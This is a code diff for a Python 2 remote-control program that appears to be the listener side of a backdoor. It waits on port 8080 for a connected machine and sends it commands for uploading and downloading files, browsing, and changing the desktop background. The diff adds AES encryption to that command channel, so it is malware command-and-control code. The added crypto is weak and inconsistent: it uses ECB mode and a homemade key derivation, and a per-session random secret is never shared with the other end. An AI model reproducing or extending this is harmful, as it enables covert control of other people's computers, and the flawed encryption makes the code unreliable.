@@ -5,13 +5,84 @@ import os
 import threading
 import subprocess
 import hashlib
-import Crypto
 import socket
+import random
+import string
+import Crypto
+import Crypto.Random
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES
 
 
-secret='SECRET P@$$w0rd_ N33DS TO B3 b!G'
+
+
+# salt size in bytes
+SALT_SIZE = 16
+
+# number of iterations in the key generation
+NUMBER_OF_ITERATIONS = 20
+
+# the size multiple required for AES
+AES_MULTIPLE = 16
+
+def generate_key(password, salt, iterations):
+    assert iterations > 0
+
+    key = password + salt
+
+    for i in range(iterations):
+        key = hashlib.sha256(key).digest()  
+
+    return key
+
+def pad_text(text, multiple):
+    extra_bytes = len(text) % multiple
+
+    padding_size = multiple - extra_bytes
+
+    padding = chr(padding_size) * padding_size
+
+    padded_text = text + padding
+
+    return padded_text
+
+def unpad_text(padded_text):
+    padding_size = ord(padded_text[-1])
+
+    text = padded_text[:-padding_size]
+
+    return text
+
+def encrypt(plaintext, password):
+    salt = Crypto.Random.get_random_bytes(SALT_SIZE)
+
+    key = generate_key(password, salt, NUMBER_OF_ITERATIONS)
+
+    cipher = AES.new(key, AES.MODE_ECB)
+
+    padded_plaintext = pad_text(plaintext, AES_MULTIPLE)
+
+    ciphertext = cipher.encrypt(padded_plaintext)
+
+    ciphertext_with_salt = salt + ciphertext
+
+    return ciphertext_with_salt
+
+def decrypt(ciphertext, password):
+    salt = ciphertext[0:SALT_SIZE]
+
+    ciphertext_sans_salt = ciphertext[SALT_SIZE:]
+
+    key = generate_key(password, salt, NUMBER_OF_ITERATIONS)
+
+    cipher = AES.new(key, AES.MODE_ECB)
+
+    padded_plaintext = cipher.decrypt(ciphertext_sans_salt)
+
+    plaintext = unpad_text(padded_plaintext)
+
+    return plaintext
+
 
 
 
@@ -67,6 +138,8 @@ def upload(conn,command):
 
 
 def _help():
+
+
 	subprocess.call('clear',shell=True)
 	print 'To see the manual of each command type help(command) ex:help(download) , to exit this menu type exit\n' 
 	
@@ -89,13 +162,19 @@ def _help():
 	return
 
 def _list():
+
 	print '\nAvailable commands:'
 	print '\nupload\ndownload\nclear\nhelp\nchange_desktop_bg\nbrowse\n'	
 
 
 def connect():
+        alpha=[0,1,2,3,4,5,6,7,8,9]
+        secret=''
+        for i in range(16):
+        	secret+=random.choice(string.letters)
+        	secret+=str(random.choice(alpha))
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(('192.168.1.2', 8080))
+        s.bind(('192.168.1.4', 8080))
         s.listen(100)
         print '[+] Listening for incoming TCP connection on port 8080'
         conn,addr=s.accept()
@@ -142,8 +221,10 @@ def connect():
                 elif command=='':
                 		pass
                 else :	
-                        conn.send(command)
-                        print conn.recv(1024)
+                        conn.send(encrypt(command,secret))
+                        result=conn.recv(2048)
+                       	result2=decrypt(result,secret)
+                       	print result2
         
 def main ():
 	subprocess.call('clear',shell=True)
